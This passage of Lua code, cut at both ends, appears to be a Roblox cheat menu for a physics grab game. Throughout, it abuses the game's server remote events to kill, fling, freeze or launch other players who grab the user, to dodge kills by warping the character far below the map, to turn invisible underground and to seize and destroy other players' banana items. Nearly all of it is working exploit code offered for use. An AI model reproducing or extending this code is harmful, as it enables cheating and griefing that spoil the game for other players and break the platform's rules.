                    local localHRP = character and character:FindFirstChild("HumanoidRootPart")
                    if not (character and head and localHRP) then continue end
                    local partOwner = head:FindFirstChild("PartOwner")
                    if not partOwner then continue end
                    local attacker = service.Players:FindFirstChild(partOwner.Value)
                    if not (attacker and attacker.Character) then continue end
                    local targetChar = attacker.Character
                    local hrp = targetChar:FindFirstChild("HumanoidRootPart")
                    local hum = targetChar:FindFirstChildOfClass("Humanoid")
                    local torso = targetChar:FindFirstChild("Torso")
                    if not hrp or not hum then continue end
                    Struggle:FireServer()
                    pcall(function()
                        SetNetworkOwner:FireServer(hrp, hrp.CFrame)
                    end)
                    task.wait(0.05)
                    if Config.SelectAutoatakka == "Death" then
                        pcall(function()
                            for _, bp in ipairs(targetChar:GetChildren()) do
                                if bp:IsA("BasePart") then
                                    bp.CFrame = CFrame.new(0, -1e9, 0)
                                    bp.CanCollide = false
                                end
                            end
                            hum.Health = 0
                            hum:ChangeState(Enum.HumanoidStateType.Dead)
                            CSV(hrp)
                            DestroyGrabLine:FireServer(hrp)
                        end)
                    elseif Config.SelectAutoatakka == "knock-back" then
                        local knockback = Instance.new("BodyVelocity")
                        knockback.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                        knockback.Velocity = (localHRP.CFrame.LookVector * 200) + Vector3.new(0, 50, 0)
                        knockback.Parent = hrp
                        service.Debris:AddItem(knockback, 0.5)
                    elseif Config.SelectAutoatakka == "air-Suspend" and torso then
                        local velocity = torso:FindFirstChild("l") or Instance.new("BodyVelocity")
                        velocity.Name = "l"
                        velocity.Velocity = Vector3.new(0, 5000, 0)
                        velocity.MaxForce = Vector3.new(0, math.huge, 0)
                        velocity.Parent = torso
                        service.Debris:AddItem(velocity, 1)
                    elseif Config.SelectAutoatakka == "Freeze" then
                        local freezeVel = Instance.new("BodyVelocity")
                        freezeVel.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                        freezeVel.Velocity = Vector3.zero
                        freezeVel.Parent = hrp
                        service.Debris:AddItem(freezeVel, 2)
                    elseif Config.SelectAutoatakka == "Fling" then
                        local flingVel = Instance.new("BodyVelocity")
                        flingVel.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                        flingVel.P = 1250
                        flingVel.Velocity = localHRP.CFrame.LookVector * 2000 + Vector3.new(0, 1000, 0)
                        flingVel.Parent = hrp
                        service.Debris:AddItem(flingVel, 3)
                    end
                end
            end)
            coroutine.resume(Config.AutoAttackerToggle)
        else
            if Config.AutoAttackerToggle then
                coroutine.close(Config.AutoAttackerToggle)
                Config.AutoAttackerToggle = nil
            end
        end
    end
})

LeftGroupBox:AddDropdown("atamode", {
    Text = "Counter Mode",
    Values = {"Death", "knock-back", "air-Suspend", "Freeze", "Fling"},
    Default = "Death",
    Callback = function(value)
        Config.SelectAutoatakka = value
    end
})

LeftGroupBox:AddToggle("AntikillB", {
    Text = "Anti-Blob (Kill)",
    CurrentValue = false,
    Callback = function(Value)
        Config.Blobkilltest = Value
        if Value then
            Config.BlobkilltestCon = task.spawn(function()
                while Config.Blobkilltest do
                    local char = GetCharacter()
                    if char then
                        local hum = char:FindFirstChild("Humanoid")
                        local hrp = char:FindFirstChild("HumanoidRootPart")
                        if hum and hrp and hum.Health > 0 then
                            hum.Sit = true
                            pcall(function()
                                hum:ChangeState(Enum.HumanoidStateType.Running)
                            end)
                            if Camera then
                                local lookVec = Camera.CFrame.LookVector
                                hrp.CFrame = CFrame.new(hrp.Position, hrp.Position + Vector3.new(lookVec.X, 0, lookVec.Z))
                            end
                        end
                    end
                    task.wait()
                end
            end)
        else
            if Config.BlobkilltestCon then
                task.cancel(Config.BlobkilltestCon)
                Config.BlobkilltestCon = nil
            end
            local char = GetCharacter()
            local hum = char and char:FindFirstChild("Humanoid")
            if hum and hum.Health > 0 then
                hum.Sit = false
                pcall(function()
                    hum:ChangeState(Enum.HumanoidStateType.Running)
                end)
            end
        end
    end,
})

LeftGroupBox:AddToggle("AntiBLobAura", {
    Text = "Anti-Blob (Aura)",
    Default = false,
    Callback = function(enabled)
        if enabled then
            if Config.AntiblobauraCon then Config.AntiblobauraCon:Disconnect() end
            Config.AntiblobauraCon = service.RunService.Heartbeat:Connect(function()
                local myCharacter = GetCharacter()
                local myRootPart = myCharacter and myCharacter:FindFirstChild("HumanoidRootPart")
                if not myRootPart then return end
                for _, player in pairs(service.Players:GetPlayers()) do
                    if player ~= localPlayer then
                        local playerCharacter = player.Character
                        local playerRootPart = playerCharacter and playerCharacter:FindFirstChild("HumanoidRootPart")
                        local playerHumanoid = playerCharacter and playerCharacter:FindFirstChild("Humanoid")
                        if playerRootPart and playerHumanoid and playerHumanoid.SeatPart then
                            local seatParent = playerHumanoid.SeatPart.Parent
                            if seatParent and seatParent.Name == "CreatureBlobman" then
                                local distance = (playerRootPart.Position - myRootPart.Position).Magnitude
                                if distance <= 25 then
                                    SetNetworkOwner:FireServer(playerRootPart, playerRootPart.CFrame)
                                end
                            end
                        end
                    end
                end
            end)
        else
            if Config.AntiblobauraCon then
                Config.AntiblobauraCon:Disconnect()
                Config.AntiblobauraCon = nil
            end
        end
    end,
})

LeftGroupBox:AddToggle("ankiltp", {
    Text = "Anti-Kill (House)",
    Default = false,
    Callback = function(val)
        Config.AntikillHouseT = val
        if Config.AntiKillHouseCon then
            Config.AntiKillHouseCon:Disconnect()
            Config.AntiKillHouseCon = nil
        end
        if val then
            Config.AntiKillHouseCon = service.RunService.Heartbeat:Connect(function()
                local char = localPlayer.Character
                if char and char:FindFirstChild("HumanoidRootPart") then
                    char.HumanoidRootPart.CFrame = CFrame.new(Config.antiKillHousePos)
                end
            end)
        end
    end
})

LeftGroupBox:AddToggle("ankilby", {
    Text = "Anti-Kill (Bypass)",
    Default = false,
    Callback = function(state)
        if state then
            if Config.IsBypassRun then return end
            Config.IsBypassRun = true
            originalFallenHeight = service.Workspace.FallenPartsDestroyHeight
            service.Workspace.FallenPartsDestroyHeight = 0 / 0
            Camera = service.Workspace.CurrentCamera
            if Camera then
                if Config.cameraTargetPart then
                    Config.cameraTargetPart:Destroy()
                    Config.cameraTargetPart = nil
                end
                Config.cameraTargetPart = Instance.new("Part")
                Config.cameraTargetPart.Name = "BypassCameraTarget"
                Config.cameraTargetPart.Size = Vector3.new(1, 1, 1)
                Config.cameraTargetPart.Transparency = 1
                Config.cameraTargetPart.Anchored = true
                Config.cameraTargetPart.CanCollide = false
                local char = localPlayer.Character
                local root = char and char:FindFirstChild("HumanoidRootPart")
                if root then
                    Config.cameraTargetPart.CFrame = root.CFrame
                    Config.lastOriginalCFrame = root.CFrame
                elseif Config.lastOriginalCFrame then
                    Config.cameraTargetPart.CFrame = Config.lastOriginalCFrame
                else
                    Config.cameraTargetPart.CFrame = CFrame.new()
                end
                Config.cameraTargetPart.Parent = service.Workspace
                Camera.CameraSubject = Config.cameraTargetPart
                Camera.CameraType = Enum.CameraType.Custom
            end
            loopCoroutine = coroutine.wrap(function()
                while Config.IsBypassRun do
                    if not localPlayer.Character then
                        task.wait(0.5)
                    else
                        local char = localPlayer.Character
                        if char then
                            local root = char:FindFirstChild("HumanoidRootPart")
                            if root then
                                if Config.lastOriginalCFrame == nil then
                                    Config.lastOriginalCFrame = root.CFrame
                                end
                                
                                local original = root.CFrame
                                local startTime = tick()
                                local radius = 10000

                                while tick() - startTime < 1 and Config.IsBypassRun do
                                    if not localPlayer.Character or not root.Parent then
                                        break
                                    end
                                    
                                    local t = tick() * 12
                                    local x = math.cos(t) * radius
                                    local z = math.sin(t) * radius
                                    root.CFrame = original + Vector3.new(x, -10000, z)
                                    
                                    service.RunService.RenderStepped:Wait()
                                end

                                if Config.IsBypassRun and root and root.Parent then
                                    root.CFrame = original
                                end
                            end
                        end
                    end
                    task.wait(0.0001)
                end
            end)
            loopCoroutine()
        else
            Config.IsBypassRun = false
            loopCoroutine = nil
            local char = localPlayer.Character
            if char and Config.lastOriginalCFrame then
                local root = char:FindFirstChild("HumanoidRootPart")
                if root then
                    root.CFrame = Config.lastOriginalCFrame
                end
            end
            if originalFallenHeight then
                service.Workspace.FallenPartsDestroyHeight = originalFallenHeight
            else
                service.Workspace.FallenPartsDestroyHeight = -100
            end
            Camera = service.Workspace.CurrentCamera
            if Camera then
                local char = localPlayer.Character
                if char then
                    local humanoid = char:FindFirstChildOfClass("Humanoid")
                    if humanoid then
                        Camera.CameraSubject = humanoid
                    end
                end
                Camera.CameraType = Enum.CameraType.Custom
            end
            if Config.cameraTargetPart then
                Config.cameraTargetPart:Destroy()
                Config.cameraTargetPart = nil
            end
        end
    end
})
repeat task.wait() until game:IsLoaded()

local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local runtimeFlags = {
    AntiGrab = false,
}

local state = {
    States = {
        ["Anti Grab"] = false,
        Escaping = false,
        Spawning = false,
        Owning = false,
    },
    FailedToys = {},
    LimbOffsetsRL = {
        Head = CFrame.new(0, 1.5, 0),
        ["Left Arm"] = CFrame.new(-1.5, 0, 0),
        ["Right Arm"] = CFrame.new(1.5, 0, 0),
        ["Left Leg"] = CFrame.new(-0.5, -2, 0),
        ["Right Leg"] = CFrame.new(0.5, -2, 0),
        Torso = CFrame.new(),
    },
}

local remotes = {}
local remoteRoot = nil
local antiGrabConnection = nil

local function locateRemoteRoot()
    local function isRemoteRoot(candidate)
        return candidate
            and candidate:FindFirstChild("GrabEvents")
            and candidate:FindFirstChild("MenuToys")
            and candidate:FindFirstChild("CharacterEvents")
    end

    if isRemoteRoot(ReplicatedStorage) then
        return ReplicatedStorage
    end
    for _, descendant in ipairs(ReplicatedStorage:GetDescendants()) do
        if isRemoteRoot(descendant) then
            return descendant
        end
    end
    return ReplicatedStorage
end

local function refreshRemotes()
    remoteRoot = locateRemoteRoot()
    local grabEvents = ReplicatedStorage:FindFirstChild("GrabEvents")
    local menuToys = remoteRoot and remoteRoot:FindFirstChild("MenuToys")
    local characterEvents = remoteRoot and remoteRoot:FindFirstChild("CharacterEvents")

    remotes.sno = grabEvents and grabEvents:FindFirstChild("SetNetworkOwner") or nil
    remotes.cgl = grabEvents and grabEvents:FindFirstChild("CreateGrabLine") or nil
    remotes.dgl = grabEvents and grabEvents:FindFirstChild("DestroyGrabLine") or nil
    remotes.Struggle = characterEvents and characterEvents:FindFirstChild("Struggle") or nil
    remotes.RagdollRemote = characterEvents and characterEvents:FindFirstChild("RagdollRemote") or nil
    remotes.spawnEvent = menuToys and menuToys:FindFirstChild("SpawnToyRemoteFunction") or nil
    remotes.destroyToyEvent = menuToys and menuToys:FindFirstChild("DestroyToy") or nil
    return remoteRoot
end

refreshRemotes()

local function fireRemote(remote, ...)
    if not remote then
        return false, nil
    end
    local ok, result = pcall(function(...)
        if remote:IsA("RemoteFunction") then
            return remote:InvokeServer(...)
        end
        remote:FireServer(...)
        return true
    end, ...)
    return ok, result
end

local H = {}

function H.charp(player)
    player = player or localPlayer
    local character = player and player.Character
    if not character then
        return nil, nil, nil
    end
    local rootPart = character:FindFirstChild("HumanoidRootPart") or character:FindFirstChild("Torso")
    local humanoid = character:FindFirstChildWhichIsA("Humanoid")
    return character, rootPart, humanoid
end

function H.resetVelocity(part)
    if part and part:IsA("BasePart") then
        part.AssemblyLinearVelocity = Vector3.zero
        part.AssemblyAngularVelocity = Vector3.zero
    end
end

function H.teleport(subject, target, offset)
    if not subject then
        return false
    end
    local part = subject
    if typeof(subject) == "Instance" and subject:IsA("Model") then
        part = subject.PrimaryPart or subject:FindFirstChildWhichIsA("BasePart", true)
    end
    if typeof(part) ~= "Instance" or not part:IsA("BasePart") then
        return false
    end
    local targetCFrame = nil
    if typeof(target) == "CFrame" then
        targetCFrame = target
    elseif typeof(target) == "Vector3" then
        targetCFrame = CFrame.new(target)
    elseif typeof(target) == "Instance" then
        if target:IsA("BasePart") then
            targetCFrame = target.CFrame
        elseif target:IsA("Model") then
            targetCFrame = target:GetPivot()
        end
    end
    if not targetCFrame then
        return false
    end
    if typeof(offset) == "CFrame" then
        targetCFrame = targetCFrame * offset
    end
    part.CFrame = targetCFrame
    H.resetVelocity(part)
    return true
end

function H.ToggleCollisions(character, enabled, skipRagdollLimb, lowPhysical)
    if typeof(character) ~= "Instance" or not character:IsA("Model") then
        return
    end

    for _, child in pairs(character:GetChildren()) do
        if child:IsA("BasePart") then
            if enabled then
                if child.Name == "Torso" or child.Name == "Head" then
                    child.CanCollide = true
                end
            else
                child.CanCollide = false
                if not skipRagdollLimb then
                    local ragdollPart = child:FindFirstChild("RagdollLimbPart")
                    if ragdollPart then
                        ragdollPart.CanCollide = false
                    end
                end
            end

            if child.Name ~= "HumanoidRootPart" then
                local properties = nil
                if lowPhysical then
                    properties = PhysicalProperties.new(0.01, 0.01, 0.01, 0.01, 0.01)
                end
                child.CustomPhysicalProperties = properties
            end
        end
    end
end

function H.RepositionLimbs(character, resetVel)
    if typeof(character) ~= "Instance" or not character:IsA("Model") then
        return false
    end

    local root = character:FindFirstChild("HumanoidRootPart")
    if not root then
        return false
    end

    local torso = character:FindFirstChild("Torso")
    if not torso then
        return false
    end

    local neck = torso:FindFirstChild("Neck")
    if neck and neck.Enabled == true then
        return false
    end

    for limbName, offset in pairs(state.LimbOffsetsRL) do
        local part = character:FindFirstChild(limbName)
        if part and part:IsA("BasePart") then
            part.CFrame = root.CFrame * offset
            if resetVel then
                H.resetVelocity(part)
            end
        end
    end

    return true
end

function H.st(name, cframe)
    if type(name) ~= "string" or state.FailedToys[name] then return nil end
    local _, root = H.charp()
    if not root or state.States.Spawning then return nil end

    local inPlot = localPlayer:FindFirstChild("InPlot")
    local inOwned = localPlayer:FindFirstChild("InOwnedPlot")
    local hiddenSpawn = inPlot ~= nil and inPlot.Value == true
    if hiddenSpawn then hiddenSpawn = not (inOwned ~= nil and inOwned.Value == true) end
    if hiddenSpawn and state.States.Owning then return nil end

    refreshRemotes()
    if not remotes.spawnEvent or not remotes.spawnEvent:IsA("RemoteFunction") then return nil end
    local spawnedFolder = Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")
    if not spawnedFolder then return nil end

    state.States.Spawning = true
    if hiddenSpawn then state.States.Owning = true end
    local childConn, heartbeatConn = nil, nil
    local renderBound = false
    local savedCF = root.CFrame
    local result = nil

    local function cleanup()
        if renderBound then pcall(function() service.RunService:UnbindFromRenderStep("STClient") end); renderBound = false end
        if heartbeatConn then heartbeatConn:Disconnect(); heartbeatConn = nil end
        if childConn then childConn:Disconnect(); childConn = nil end
        if hiddenSpawn and root and root.Parent then root.CFrame = savedCF end
        state.States.Spawning = false
        if hiddenSpawn then state.States.Owning = false end
    end

    local ok, err = pcall(function()
        local canSpawnToy = localPlayer:FindFirstChild("CanSpawnToy")
        if canSpawnToy then
            while canSpawnToy.Value == false do
                task.wait()
                if not root.Parent then return end
            end
        end
        local base = hiddenSpawn and CFrame.new(0, 25, 0) or (root.CFrame + Vector3.new(0, 15, 0))
        local requested = typeof(cframe) == "CFrame" and cframe or base
        local spawnCF = CFrame.new(requested.Position) + Vector3.new(0, 0, 20)
        local rotate = Workspace:FindFirstChild("RotateOrientPart")
        local rotation = rotate and rotate.Rotation or Vector3.zero

        childConn = spawnedFolder.ChildAdded:Connect(function(child)
            if child.Name == name then
                result = child
                if childConn then childConn:Disconnect(); childConn = nil end
            end
        end)
        savedCF = root.CFrame
        if hiddenSpawn then
            local hiddenCF = CFrame.new(0, 10, 0)
            pcall(function() service.RunService:UnbindFromRenderStep("STClient") end)
            service.RunService:BindToRenderStep("STClient", Enum.RenderPriority.Camera.Value - 1, function()
                if root.Parent then root.CFrame = savedCF end
            end)
            renderBound = true
            heartbeatConn = service.RunService.Heartbeat:Connect(function()
                if root.Parent then savedCF = root.CFrame; root.CFrame = hiddenCF end
            end)
        end
        local function invokeSpawn()
            fireRemote(remotes.spawnEvent, name, spawnCF, rotation)
        end
        task.spawn(invokeSpawn)
        local started = tick()
        while true do
            RunService.Heartbeat:Wait()
            if hiddenSpawn then task.spawn(invokeSpawn) end
            if result or tick() - started > 1.3 then break end
        end
    end)
    cleanup()
    if not ok then warn(("[AntiGrab st] %s"):format(tostring(err))); return nil end
    if not result then
        state.FailedToys[name] = true
        task.delay(2, function() state.FailedToys[name] = nil end)
    end
    return result
end

function H.dt(model)
    if typeof(model) ~= "Instance" or not model:IsA("Model") then return false end
    refreshRemotes()
    if not remotes.destroyToyEvent then return false end
    local ok = fireRemote(remotes.destroyToyEvent, model)
    return ok == true
end

local function recoveredYield(duration)
    local waitTime = duration or 0
    local started = tick()
    repeat
        service.RunService.Heartbeat:Wait()
    until tick() - started >= waitTime
    return true
end

function H.ExtraEscape(returnCFrame)
    local _, rootPart, humanoid = H.charp()

    if not rootPart
        or not humanoid
        or humanoid.Health == 0
        or state.States.Escaping
    then
        return
    end

    local inPlot = localPlayer:FindFirstChild("InPlot")
    if not inPlot or inPlot.Value then
        return
    end

    state.States.Escaping = true

    local waypoints = Workspace:FindFirstChild("Waypoints")
    local tudorHouse = waypoints and waypoints:FindFirstChild("TudorHouse")

    if not tudorHouse then
        state.States.Escaping = false
        return
    end

    local toy = H.st("TractorGreen", tudorHouse.CFrame)

    if not toy then
        state.States.Escaping = false
        return
    end

    local seat = toy:WaitForChild("VehicleSeat", 1)

    if not seat then
        state.States.Escaping = false
        return H.dt(toy)
    end

    local started = tick()
    local escaped = false

    humanoid.Sit = false
    seat:Sit(humanoid)

    local connection = seat.ChildAdded:Connect(function(child)
        if child.Name == "SeatWeld" then
            child.Enabled = false
            escaped = true
            child:Destroy()
        end
    end)

    while true do
        recoveredYield()
        if escaped then break end
        if tick() - started > 0.7 then break end
    end

    connection:Disconnect()
    humanoid.Sit = false

    -- 【追加】トイを消去したあと、掴まれた元の位置へテレポート
    H.dt(toy)
    if returnCFrame then
        H.teleport(rootPart, returnCFrame)
    end

    state.States.Escaping = false
    return true
end

local function stopAntiGrab()
    if antiGrabConnection then
        antiGrabConnection:Disconnect()
        antiGrabConnection = nil
    end

    state.States["Anti Grab"] = false
end

local function startAntiGrabIfNeeded()
    if not runtimeFlags.AntiGrab
        or not isHeld.Value
        or state.States["Anti Grab"]
    then
        return
    end

    refreshRemotes()

    if remotes.Struggle then
        fireRemote(remotes.Struggle)
    end

    local character, rootPart, humanoid = H.charp()

    if not humanoid or not rootPart then
        return
    end

    state.States["Anti Grab"] = true

    -- 【変更】掴まれた位置を取得して ExtraEscape に渡す
    local originalCF = rootPart.CFrame
    task.spawn(H.ExtraEscape, originalCF)

    local lastExtraEscape = tick()

    antiGrabConnection = service.RunService.Heartbeat:Connect(function(dt)
        if remotes.Struggle then
            fireRemote(remotes.Struggle)
        end

        local now = tick()
        if now - lastExtraEscape > 2 then
            -- ループ呼び出し時も、元の位置（originalCF）を指定して脱出を実行
            task.spawn(H.ExtraEscape, originalCF)
            lastExtraEscape = tick()
        end

        if not isHeld.Value or not runtimeFlags.AntiGrab then
            state.States["Anti Grab"] = false

            if antiGrabConnection then
                antiGrabConnection:Disconnect()
                antiGrabConnection = nil
            end
        end
    end)
end

task.spawn(function()
    while task.wait(0.03) do
        if runtimeFlags.AntiGrab then
            startAntiGrabIfNeeded()
        elseif state.States["Anti Grab"] then
            stopAntiGrab()
        end
    end
end)

LeftGroupBox:AddToggle("Antikill", {
    Text = "Anti-Kill (Grab)",
    Default = false,
    Callback = function(value)
        runtimeFlags.AntiGrab = value
        if value then
        else
        end
    end,
})

LeftGroupBox:AddToggle("Invisi", {
	Text = "Invisibility",
	Default = false,
	Callback = function(enabled)
		Invisibility = Invisibility or {}
		Invisibility.noclipEnabled = enabled
		Invisibility.cameraOffset = 10
		Invisibility.undergroundDepthOffset = 20
		Invisibility.character = GetCharacter()
		Invisibility.humanoidRootPart = Invisibility.character:WaitForChild("HumanoidRootPart")
		Invisibility.head = Invisibility.character:WaitForChild("Head")
		Invisibility.camera = Workspace.CurrentCamera
		if enabled then
			Invisibility.originalPosition = Invisibility.humanoidRootPart.Position
			Invisibility.originalCameraCFrame = Invisibility.camera.CFrame
			Invisibility.humanoidRootPartTransparency = Invisibility.humanoidRootPart.Transparency
			if Invisibility.humanoidRootPart then
				Invisibility.humanoidRootPart.Transparency = 1
			end
			if Invisibility.noclipConnection then
				Invisibility.noclipConnection:Disconnect()
			end
			Invisibility.noclipConnection = service.RunService.Stepped:Connect(function()
				for _, part in pairs(Invisibility.character:GetChildren()) do
					if part:IsA("BasePart") then
						part.CanCollide = false
					end
				end
			end)
			local characterHeight = Invisibility.originalPosition.Y
			local cameraTargetHeight = characterHeight + Invisibility.cameraOffset
			local undergroundDepth = cameraTargetHeight - Invisibility.undergroundDepthOffset
			local undergroundPos = Vector3.new(Invisibility.originalPosition.X, undergroundDepth, Invisibility.originalPosition.Z)
			Invisibility.humanoidRootPart.CFrame = CFrame.new(undergroundPos)
			local currentCameraCF = Invisibility.camera.CFrame
			local cameraPos = Vector3.new(undergroundPos.X, cameraTargetHeight, undergroundPos.Z)
			Invisibility.camera.CFrame = CFrame.new(cameraPos, cameraPos + currentCameraCF.LookVector)
		else
			if Invisibility.noclipConnection then
				Invisibility.noclipConnection:Disconnect()
				Invisibility.noclipConnection = nil
			end
			if Invisibility.originalPosition then
				local surfacePos = Vector3.new(Invisibility.humanoidRootPart.Position.X, Invisibility.originalPosition.Y, Invisibility.humanoidRootPart.Position.Z)
				Invisibility.humanoidRootPart.CFrame = CFrame.new(surfacePos)
			end
			if Invisibility.humanoidRootPart then
				Invisibility.humanoidRootPart.Transparency = Invisibility.humanoidRootPartTransparency or 0
			end
		end
	end
})

LeftGroupBox:AddToggle("Antiragd", {
    Text = "Anti-Ragdoll",
    Default = false,
    Callback = function(Value)
        Config.AntiragdollToggle = Value
        if not Config.connections then Config.connections = {} end
        if Config.AntiragdollToggle then
            Config.onCharacter = function(char)
                local humanoid = char:WaitForChild("Humanoid", 5)
                if humanoid and Config.AntiragdollToggle then
                    humanoid.BreakJointsOnDeath = false
                    humanoid.AutoRotate = true
                    humanoid.PlatformStand = false
                    table.insert(Config.connections, humanoid.HealthChanged:Connect(function(health)
                        if Config.AntiragdollToggle and health <= 0 then
                            humanoid.Health = 1
                        end
                    end))
                    table.insert(Config.connections, humanoid:GetPropertyChangedSignal("AutoRotate"):Connect(function()
                        if Config.AntiragdollToggle and humanoid.AutoRotate == false then
                            humanoid.AutoRotate = true
                        end
                    end))
                    table.insert(Config.connections, humanoid:GetPropertyChangedSignal("PlatformStand"):Connect(function()
                        if Config.AntiragdollToggle and humanoid.PlatformStand == true then
                            humanoid.PlatformStand = false
                        end
                    end))
                    table.insert(Config.connections, service.RunService.RenderStepped:Connect(function()
                        if Config.AntiragdollToggle then
                            if humanoid.Sit and humanoid.SeatPart == nil then
                                humanoid.Sit = false
                            end
                        end
                    end))
                end
            end
            if localPlayer.Character then
                Config.onCharacter(localPlayer.Character)
            end
            Config.charAddedConn = localPlayer.CharacterAdded:Connect(Config.onCharacter)
        else
            for _, conn in ipairs(Config.connections) do
                if conn then conn:Disconnect() end
            end
            Config.connections = {}
            if Config.charAddedConn then
                Config.charAddedConn:Disconnect()
                Config.charAddedConn = nil
            end
        end
    end
})

LeftGroupBox:AddToggle("antiragdoll", {
    Text = "Anti-Ragdoll (On Blob)",
    Default = false,
    Callback = function(Value)
        Config.AntiRagBlob = Value
        Config.BlobRagdollSit = false
        if Config.Contuuti["ARChar"] then Config.Contuuti["ARChar"]:Disconnect() end
        if Config.Contuuti["ARSeat"] then Config.Contuuti["ARSeat"]:Disconnect() end
        if Config.AntiRagBlob then
            if localPlayer.Character then
                local char = localPlayer.Character
                if char and Config.AntiRagBlob then
                    local hum = char:WaitForChild("Humanoid", 5)
                    local HRP = char:WaitForChild("HumanoidRootPart", 5)
                    if hum and HRP then
                        if Config.Contuuti["ARSeat"] then Config.Contuuti["ARSeat"]:Disconnect() end
                        Config.Contuuti["ARSeat"] = hum:GetPropertyChangedSignal("SeatPart"):Connect(function()
                            if hum.SeatPart and hum.SeatPart.Parent and hum.SeatPart.Parent.Name == "CreatureBlobman" and not Config.BlobRagdollSit then
                                Config.BlobRagdollSit = true
                                local Seat = hum.SeatPart
                                while not hum.Sit do task.wait() end
                                RagdollRemote:FireServer(HRP, 3)
                                local ragdolledVal = hum:FindFirstChild("Ragdolled")
                                while ragdolledVal and not ragdolledVal.Value and not hum.Sit do task.wait() end
                                task.wait(0.4)
                                hum.Sit = false
                                Seat:Sit(hum)
                                task.delay(0.25, function()
                                    while hum and hum.SeatPart do
                                        RagdollRemote:FireServer(HRP, 1)
                                        task.wait(0.05)
                                    end
                                    Config.BlobRagdollSit = false
                                end)
                            end
                        end)
                    end
                end
            end
            Config.Contuuti["ARChar"] = localPlayer.CharacterAdded:Connect(function(char)
                if not char or not Config.AntiRagBlob then return end
                local hum = char:WaitForChild("Humanoid", 5)
                local HRP = char:WaitForChild("HumanoidRootPart", 5)
                if not (hum and HRP) then return end
                if Config.Contuuti["ARSeat"] then Config.Contuuti["ARSeat"]:Disconnect() end
                Config.Contuuti["ARSeat"] = hum:GetPropertyChangedSignal("SeatPart"):Connect(function()
                    if hum.SeatPart and hum.SeatPart.Parent and hum.SeatPart.Parent.Name == "CreatureBlobman" and not Config.BlobRagdollSit then
                        Config.BlobRagdollSit = true
                        local Seat = hum.SeatPart
                        while not hum.Sit do task.wait() end
                        RagdollRemote:FireServer(HRP, 3)
                        local ragdolledVal = hum:FindFirstChild("Ragdolled")
                        while ragdolledVal and not ragdolledVal.Value and not hum.Sit do task.wait() end
                        task.wait(0.4)
                        hum.Sit = false
                        Seat:Sit(hum)
                        task.delay(0.25, function()
                            while hum and hum.SeatPart do
                                RagdollRemote:FireServer(HRP, 1)
                                task.wait(0.05)
                            end
                            Config.BlobRagdollSit = false
                        end)
                    end
                end)
            end)
        end
    end
})

LeftGroupBox:AddToggle("AntiSit", {
    Text = "Anti-Sit",
    Default = false,
    Callback = function(Value)
        Config.antibananaSit = Value
        if Value then
            task.spawn(function()
                while Config.antibananaSit do
                    local character = localPlayer.Character
                    local hum = character and character:FindFirstChildOfClass("Humanoid")
                    local hrp = character and character:FindFirstChild("HumanoidRootPart")
                    local camera = workspace.CurrentCamera
                    if hum and hrp and hum.Health > 0 then
                        hum.Sit = false
                        hum:ChangeState(Enum.HumanoidStateType.Running)
                        local vec = camera.CFrame.LookVector
                        hrp.CFrame = CFrame.new(
                            hrp.Position,
                            hrp.Position + Vector3.new(vec.X, 0, vec.Z)
                        )
                    end
                    task.wait()
                end
            end)
        end
    end
})

LeftGroupBox:AddToggle("AntiBananaD", {
    Text = "Anti-Banana (Destroy Banana)",
    Default = false,
    Callback = function(Value)
        Config.Antbananadest = Value
        Config.Bananans = Config.Bananans or {}
        Config.AntiBananaCon = Config.AntiBananaCon or {}
        for name, connection in pairs(Config.AntiBananaCon) do
            connection:Disconnect()
            Config.AntiBananaCon[name] = nil
        end
        if not Value then
            table.clear(Config.Bananans)
            return
        end
        for _, player in pairs(service.Players:GetPlayers()) do
            local container = service.Workspace:FindFirstChild(player.Name .. "SpawnedInToys")
            if container then
                for _, child in pairs(container:GetChildren()) do
                    if child.Name == "FoodBanana" then
                        task.spawn(function()
                            local banana = child
                            local holdPart = nil
                            if banana then
                                for _, descendant in pairs(banana:GetDescendants()) do
                                    if descendant.Name == "HoldPart" then
                                        holdPart = descendant
                                        break
                                    end
                                end
                            end
                            if holdPart then
                                local holdRF = nil
                                local dropRF = nil
                                local rigid = nil
                                for _, descendant in pairs(holdPart:GetDescendants()) do
                                    if descendant.Name == "HoldItemRemoteFunction" then
                                        holdRF = descendant
                                    elseif descendant.Name == "DropItemRemoteFunction" then
                                        dropRF = descendant
                                    elseif descendant.Name == "RigidConstraint" then
                                        rigid = descendant
                                    end
                                end
                                if rigid and rigid:FindFirstChild("Attachment1") then
                                    repeat
                                        task.wait()
                                    until not rigid:FindFirstChild("Attachment1") or not banana.Parent
                                end
                                if dropRF and holdRF then
                                    repeat
                                        task.wait()
                                        task.spawn(function()
                                            pcall(function()
                                                holdRF:InvokeServer(banana, GetCharacter())
                                            end)
                                        end)
                                        pcall(function()
                                            dropRF:InvokeServer(banana, CFrame.new(0, -51000, 0), Vector3.zero)
                                        end)
                                    until not banana.Parent or not Config.Antbananadest
                                    if banana.Parent then
                                        table.insert(Config.Bananans, banana)
                                    end
                                end
                            end
                        end)
                    end
                end
                Config.AntiBananaCon[container.Name .. "BananaConn"] = container.ChildAdded:Connect(function(newChild)
                    if newChild.Name == "FoodBanana" then
                        task.wait(service.Stats.Network.ServerStatsItem["Data Ping"]:GetValue() / 900)
                        task.spawn(function()
                            local banana = newChild
                            local holdPart = nil
                            if banana then
                                for _, descendant in pairs(banana:GetDescendants()) do
                                    if descendant.Name == "HoldPart" then
                                        holdPart = descendant
                                        break
                                    end
                                end
                            end
                            if holdPart then
                                local holdRF = nil
                                local dropRF = nil
                                local rigid = nil
                                for _, descendant in pairs(holdPart:GetDescendants()) do
                                    if descendant.Name == "HoldItemRemoteFunction" then
                                        holdRF = descendant
                                    elseif descendant.Name == "DropItemRemoteFunction" then
                                        dropRF = descendant
                                    elseif descendant.Name == "RigidConstraint" then
                                        rigid = descendant
                                    end
                                end
                                if rigid and rigid:FindFirstChild("Attachment1") then
                                    repeat
                                        task.wait()
                                    until not rigid:FindFirstChild("Attachment1") or not banana.Parent
                                end
                                if dropRF and holdRF then
                                    repeat
                                        task.wait()
                                        task.spawn(function()
                                            pcall(function()
                                                holdRF:InvokeServer(banana, GetCharacter())
                                            end)
                                        end)
                                        pcall(function()
                                            dropRF:InvokeServer(banana, CFrame.new(0, -51000, 0), Vector3.zero)
                                        end)
                                    until not banana.Parent or not Config.Antbananadest
                                    if banana.Parent then
                                        table.insert(Config.Bananans, banana)
                                    end
